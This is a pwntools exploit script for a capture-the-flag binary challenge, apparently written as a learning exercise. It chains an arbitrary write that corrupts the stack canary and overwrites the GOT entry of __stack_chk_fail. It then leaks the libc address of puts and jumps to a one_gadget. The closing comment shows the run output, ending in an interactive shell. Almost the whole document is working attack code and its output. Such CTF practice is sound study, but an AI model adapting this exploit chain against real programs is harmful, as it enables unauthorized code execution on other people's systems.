#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# $ pwn template ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')
libc = ELF('libc.so.6')

context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# main: 0x4007D6
# break *0x4007D6
# break *0x4008B5
# break *0x4008D3
# break *0x4007A5
# break *0x4007c0
# break *0x400905
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
break *0x4008b8
continue
'''.format(**locals())

io = start()

# Overwriting canary with 1 byte to fail check cookie and run binary again

# Sending size, provide big enough value to ommit storage on heap / e.g. 0x00007f0cad78c010
io.recvuntil('size: ')
io.send(b'1231231') # hex: 0x12c97f

# Sending idx, overwrite 1 byte (canary), rax -> our written idx, rdx -> memory from malloc
io.recvuntil('idx: ')
io.send(str(0x12e4d8)) # 0x12e4d8 -> distance between rdx (our malloc'ed memory) & canary
log.success('Canary overwrittten!')

# Sending where
io.recvuntil('where: ') # Overwriting __stack_chk_fail with start of main()
io.send(str(0x601018))

# Arbitrary write -> Overwrite to _start/main
# io.send(b'A'*8)
io.send(p64(0x4007D6))

io.recvuntil('puts: ')
puts_address_libc = int(io.recvuntil('\n')[:-1], 16)
io.recvuntil('size: ')

print('[*] puts_address_libc = ' + hex(puts_address_libc))

libc_base = puts_address_libc - libc.symbols['puts']
print('[*] libc_base: ' + hex(libc_base))

#2 

# Sending size, provide big enough value to ommit storage on heap / 0x00007f0cad78c010

io.send(b'1231231') # hex: 0x12c97f

io.recvuntil('idx: ')
io.send(str(0x12e4d8+0x60a000+1)) # Overwrite other byte of canary again
log.success('Canary overwrittten again!')

io.recvuntil('where: ') # Overwriting __stack_chk_fail with one_gadget
io.send(str(0x601018))

# $ one_gadget --level=5 libc.so.6 --raw

one_gadgets = list(map(int, '324293 324386 939679 940120 940127 940131 1090444 1090456'.split()))

io.send(p64(libc_base + one_gadgets[1]))

io.interactive()

'''
1. Run: overwriting canary, got's ___stack_chk_fail with main()
2. Run programu: leaking puts, overwriting canary, got's ___stack_chk_fail with one_gadget


$ python3 exploit.py
[*] '/mnt/hgfs/LEARN/look/dist/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/mnt/hgfs/LEARN/look/dist/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/mnt/hgfs/LEARN/look/dist/chall': pid 49895
[+] Canary overwrittten!
[*] puts_address_libc = 0x7f7f171599c0
[*] libc_base: 0x7f7f170d9000
[+] Canary overwrittten again!
[*] Switching to interactive mode
6295576$ whoami
junior
$ ls
chall       chall.id2  core       exploit.py
chall.id0  chall.nam  Dockerfile libc.so.6

$
'''
